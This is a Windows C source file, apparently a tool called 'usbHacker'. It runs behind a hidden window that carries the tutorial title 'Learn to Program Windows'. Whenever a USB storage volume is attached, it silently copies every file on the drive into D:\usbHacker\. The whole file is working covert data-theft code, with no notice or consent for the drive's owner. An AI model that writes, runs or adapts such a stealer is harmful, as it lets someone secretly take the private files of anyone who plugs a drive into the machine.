#include <stdio.h>
#include <windows.h>
#include <Dbt.h>
#include <tchar.h>
#include <Strsafe.h>
#define  BUFSIZE  MAX_PATH
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

TCHAR DEFAULT_PATH[MAX_PATH] = TEXT("D:\\usbHacker\\");
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	// Register the window class.
	const wchar_t CLASS_NAME[]  = L"Sample Window Class";

	WNDCLASS wc = { };

	wc.lpfnWndProc   = WindowProc;
	wc.hInstance     = hInstance;
	wc.lpszClassName = CLASS_NAME;

	RegisterClass(&wc);

	// Create the window.

	HWND hwnd = CreateWindowEx(
		0,                              // Optional window styles.
		CLASS_NAME,                     // Window class
		L"Learn to Program Windows",    // Window text
		WS_OVERLAPPEDWINDOW,            // Window style

		// Size and position
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

		NULL,       // Parent window    
		NULL,       // Menu
		hInstance,  // Instance handle
		NULL        // Additional application data
		);

	if (hwnd == NULL)
	{
		return 0;
	}

	ShowWindow(hwnd, SW_HIDE);

	// Run the message loop.

	MSG msg = { };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
 TCHAR FirstDriveFromMask (ULONG unitmask)
{
	TCHAR i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}

 VOID FindAllFile(TCHAR RootDir[MAX_PATH]){
	 TCHAR szDir[MAX_PATH];
	 WIN32_FIND_DATA ffd;
	 HANDLE hFind = INVALID_HANDLE_VALUE;
	 StringCchCopy(szDir, MAX_PATH,RootDir);
	 StringCchCat(szDir, MAX_PATH, TEXT("\\*"));

	 hFind = FindFirstFile(szDir,&ffd);
	 if (INVALID_HANDLE_VALUE == hFind)
	 {
		 return ;
	 }
	 do 
	 {
		 if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		 {
			 if (ffd.cFileName[0] != TEXT('.'))
			 {
				 TCHAR srcDir[MAX_PATH];
				 StringCchCopy(srcDir,MAX_PATH,RootDir);
				 StringCchCat(srcDir,MAX_PATH,ffd.cFileName);
				 StringCchCat(srcDir,MAX_PATH,TEXT("\\"));

				 TCHAR desDir[MAX_PATH];
				 StringCchCopy(desDir,MAX_PATH,DEFAULT_PATH);
				 StringCchCat(desDir,MAX_PATH,ffd.cFileName);
				 CreateDirectory(desDir,NULL);
				 FindAllFile(srcDir);
			 }
		 }
		 else
		 {
			 TCHAR srcDir[MAX_PATH];
			 StringCchCopy(srcDir,MAX_PATH,RootDir);
			 StringCchCat(srcDir,MAX_PATH,ffd.cFileName);

			 TCHAR tempDir[MAX_PATH];
			 StringCchCopy(tempDir,MAX_PATH,DEFAULT_PATH);
			 for (INT i = 0;( i<(lstrlen(srcDir)-3))&&srcDir[i+3]!=TEXT('\0');i++)
			 {
				 tempDir[lstrlen(DEFAULT_PATH)+i] = srcDir[i+3];
			 }
			 tempDir[lstrlen(DEFAULT_PATH)+lstrlen(srcDir)-3] = '\0';
			 TCHAR desDir[MAX_PATH];
			 StringCchCopy(desDir,MAX_PATH,tempDir);
			 CopyFile(srcDir,desDir,FALSE);
		 }
	 } while (FindNextFile(hFind,&ffd) != 0);
	 FindClose(hFind);
 }

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
		case WM_DESTROY:
		PostQuitMessage(0);
		return 0;

		case WM_DEVICECHANGE:
		{
			if (wParam == DBT_DEVICEARRIVAL)
			{
				PDEV_BROADCAST_HDR usbInfo=(PDEV_BROADCAST_HDR) lParam;
				if (usbInfo->dbch_devicetype == DBT_DEVTYP_VOLUME)
				{
					PDEV_BROADCAST_VOLUME  volumeInfo=(PDEV_BROADCAST_VOLUME ) usbInfo;
					TCHAR msg = (FirstDriveFromMask(volumeInfo ->dbcv_unitmask));
					TCHAR buffer[BUFSIZE] = L"";
					buffer[0] = msg;
					buffer[1] = ':';
					buffer[2] = '\0';
					StringCchCat(buffer,MAX_PATH,TEXT("\\"));
					CreateDirectory(DEFAULT_PATH,NULL);
					FindAllFile(buffer);
				}
			}
		}
		return 0;

	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
